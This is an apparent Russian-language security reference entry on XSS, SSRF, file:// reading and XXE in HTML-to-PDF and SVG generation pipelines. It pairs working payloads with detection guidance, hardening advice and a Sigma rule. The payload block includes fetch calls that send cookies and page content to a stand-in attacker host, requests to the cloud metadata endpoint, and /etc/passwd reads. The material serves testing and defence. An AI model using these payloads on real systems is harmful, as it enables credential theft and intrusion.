---
id: xss-pdf-svg-generation
title: "XSS/инъекции при генерации PDF и SVG из пользовательских данных"
type: xss
target: backend
category: web
difficulty: intermediate
bypass: none
tags: [xss, pdf, svg, ssrf, html-to-pdf, puppeteer, weasyprint, xxe]
tested_on: ["WeasyPrint", "wkhtmltopdf", "Puppeteer/Chromium (контейнеры)"]
success_rate: 0.5
risk: high
cwe: "CWE-79"
lab: null
last_verified: "2026-10-23"
references:
  - "https://portswigger.net/web-security/all-topics"
  - "https://weasyprint.readthedocs.io/"
  - "https://owasp.org/www-community/attacks/"
---

# XSS/инъекции при генерации PDF и SVG из пользовательских данных

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
# ── векторы для HTML -> PDF (Puppeteer/wkhtmltopdf/WeasyPrint) ────
# 1) выполнение JS в контексте генератора (Puppeteer, headless Chrome)
<script>fetch('http://attacker.tld/?c='+document.cookie)</script>
<img src=x onerror="fetch('http://attacker.tld/?'+btoa(document.documentElement.innerHTML))">
# 2) SSRF через внешние ресурсы, которые загружает генератор
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<link rel=stylesheet href="http://127.0.0.1:6379/">
<iframe src="file:///etc/passwd"></iframe>
# 3) чтение локальных файлов (file://)
<iframe src="file:///etc/hostname" width=600 height=200></iframe>
<object data="file:///etc/passwd"></object>
# 4) CSS-каналы: exfiltration через url() и @import
<style>@import 'http://attacker.tld/track.css';</style>
<div style="background:url('http://attacker.tld/?x=1')"></div>
# 5) инъекция в шаблон отчёта (SSTI-подобная) при конкатенации HTML

# ── векторы для SVG ────────────────────────────────────────────────
# 1) скрипты внутри SVG (исполняются при отображении в браузере)
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>alert(document.domain)</script>
</svg>
# 2) внешние сущности (XXE в SVG-парсерах)
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>
# 3) foreignObject — вставка HTML внутрь SVG
<svg xmlns="http://www.w3.org/2000/svg"><foreignObject>
  <body xmlns="http://www.w3.org/1999/xhtml"><script>alert(document.domain)</script></body>
</foreignObject></svg>
# 4) xlink:href с javascript:
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <a xlink:href="javascript:alert(document.domain)"><rect width="100" height="100"/></a></svg>

# ── проверка своего конвейера генерации (стенд) ────────────────────
# grep -rn "innerHTML\|write(.*html\|render_template_string" src/
# проверить: блокируется ли file:// и внешние http-запросы в генераторе
```

## Explanation

Генерация документов из пользовательских данных — недооценённый вектор,
потому что «PDF же не исполняет код». Исполняет, если в конвейере есть
браузерный движок или XML-парсер.

**HTML → PDF** (Puppeteer/Playwright, wkhtmltopdf, WeasyPrint, Prince):

1. **JS-исполнение**: headless-рендерер выполняет скрипты — отсюда
    эксфильтрация cookies, DOM-содержимого, токенов генератора.
2. **SSRF и file://**: генератор сам загружает внешние ресурсы
    (`<img src>`, `@import`, `<link>`), а значит имеет сетевой доступ
    из внутренней сети и может читать локальные файлы. Это полноценный
    SSRF/LFI-вектор с привилегиями процесса генерации.
3. **Инъекция в шаблон**: конкатенация HTML из данных пользователя —
    обычный XSS/SSTI, просто результат виден в документе.
4. **Утечка в документе**: даже без JS данные могут попасть в PDF
    (метаданные, скрытые поля), а затем уйти внешнему получателю.

**SVG** — это XML + возможность скриптов:

* `<script>` и обработчики событий (`onload`) исполняются при
  отображении SVG в браузере (inline или через `<object>`/`<iframe>`);
* `foreignObject` позволяет вложить полноценный HTML внутрь SVG;
* DTD/внешние сущности → XXE в парсерах, которые обрабатывают
  загруженные SVG (конвертеры, превью, валидаторы);
* `xlink:href="javascript:..."` — классический вектор.

Практический вывод: пользовательский HTML/SVG должен либо не
использоваться, либо проходить через санитайзер с жёстким allowlist,
а генератор — работать в изолированном окружении без сетевого доступа
и без прав на чтение локальных файлов.

## Detection

* Логи генератора: всплеск исходящих HTTP/DNS-запросов от процесса
  конвертации — признак SSRF/OOB-эксфильтрации.
* Алерт на обращение процесса генерации к `169.254.169.254`,
  loopback-портам, `file://`.
* Детект в загружаемом контенте: `<script`, `onerror=`, `onload=`,
  `<!DOCTYPE`, `<!ENTITY`, `foreignObject`, `javascript:`,
  `file:///`, `@import` в пользовательских полях и файлах.
* Логи приложений: ошибки парсера SVG/XML, таймауты конвертации
  (признак попытки OOB).
* Сетевой мониторинг: исходящий трафик от воркеров конвертации
  должен быть пустым или строго allowlisted.
* Файловые аудит-логи: чтение `/etc/*` процессом генерации.
* DAST/сканеры загрузки: проверка, что SVG отклоняется или санитизируется.

## Remediation

- Не рендерить пользовательский HTML напрямую: шаблоны с
  экранированием, данные — только значения, а не разметка.
- Если rich text нужен: DOMPurify/bleach с allowlist **до** передачи
  в генератор; запрет `<script>`, `on*`, `<iframe>`, `<object>`,
  `<link>`, `<style>` с `@import`, `file://`, `data:`.
- SVG: отклонять или конвертировать в растр (потеря скриптов),
  запрещать DTD в парсере, отключать внешние сущности,
  санитизировать `xlink:href`/`href`.
- Изоляция генератора: отдельный контейнер/воркер, read-only rootfs,
  non-root, `cap_drop: ALL`, egress-политика (только allowlist доменов),
  запрет `file://` (в Puppeteer: `--disable-file-system`,
  `request interception` с блокировкой нестандартных схем),
  `--no-sandbox` не использовать без нужды, отключить JS где возможно
  (`--disable-javascript` в wkhtmltopdf, `javaScriptEnabled: false`).
- Таймауты и лимиты: размер документа, число внешних ресурсов,
  общее время рендеринга (защита от «висящих» OOB-запросов).
- Метаданные: очищать метаданные PDF перед выдачей клиенту.
- Отдавать пользовательские файлы с `Content-Disposition: attachment`
  и `X-Content-Type-Options: nosniff`, на отдельном origin (cookie-less).
- Тесты: в CI — негативные кейсы загрузки SVG/HTML с векторами
  (см. `payloads/web/upload/svg-script-and-xxe.md`).

## Detection rules

```yaml
title: XSS в HTML->PDF/SVG конвейере — JS с эксфильтрацией DOM и cookie
id: e5f6a7b8-0051-4e5f-9a7b-000000000051
status: experimental
description: >-
  Пользовательские данные попадают в шаблон, который рендерит headless-браузер
  (Puppeteer/wkhtmltopdf/WeasyPrint): fetch/btoa(document...) в теле запроса,
  событие pdf_generate с JS-вставкой. Успех — утечка cookie/ DOM на внешний хост.
references:
  - https://attack.mitre.org/techniques/T1189/
logsource:
  category: webserver
  definition: 'access-лог и логи сервиса генерации PDF (event_action pdf_generate)'
detection:
  selection_query:
    cs-uri-query|contains:
      - 'btoa(document'
      - '<script>fetch'
      - "onerror=\"fetch('http"
  selection_pdf:
    event_action: pdf_generate
    request_body|contains:
      - '<script>fetch'
      - 'document.cookie'
      - 'btoa(document'
      - '<iframe'
  condition: selection_query or selection_pdf
fields:
  - c-ip
  - cs-uri-query
  - request_path
  - request_body
falsepositives:
  - штатные шаблоны отчётов с <iframe> (исключайте внутренние источники шаблонов)
level: high
tags:
  - attack.initial_access
  - attack.t1189
  - cwe.79
```
